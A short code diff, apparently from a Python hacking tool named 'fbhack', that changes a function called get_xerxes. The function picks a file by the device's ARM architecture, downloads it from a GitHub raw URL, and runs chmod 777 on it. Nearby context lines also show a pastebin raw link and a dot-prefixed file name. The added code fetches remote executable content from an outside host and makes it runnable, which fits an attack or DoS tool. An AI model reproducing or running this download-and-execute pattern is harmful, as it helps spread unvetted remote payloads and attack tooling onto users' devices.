@@ -18,12 +18,21 @@ pastebin = "https://pastebin.com/raw/cvgURkA6"
 myname = ".demp.ov"
 
 
-def get_xerxes():
-  armv = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/libs/libs.pl"
 
-  if "armv" in platform.machine():
-    urllib.urlretrieve(armv,"{}/libs.pl".format(mypwd))
+
+def get_xerxes():
+  plat = platform.machine()
+  armv7_8l = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/libs/libs.pl"
+  armv61 = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/libs/libs"
+
+  if "armv7l" in plat or "armv8l" in plat:
+    urllib.urlretrieve(armv7_8l,"{}/libs.pl".format(mypwd))
     os.system("chmod 777 {}/libs.pl".format(mypwd))
+
+  if "armv61" in plat:
+    urllib.urlretrieve(armv61,"{}/libs.pl".format(mypwd))
+    os.system("chmod 777 {}/libs.pl".format(mypwd))
+
 
 
 
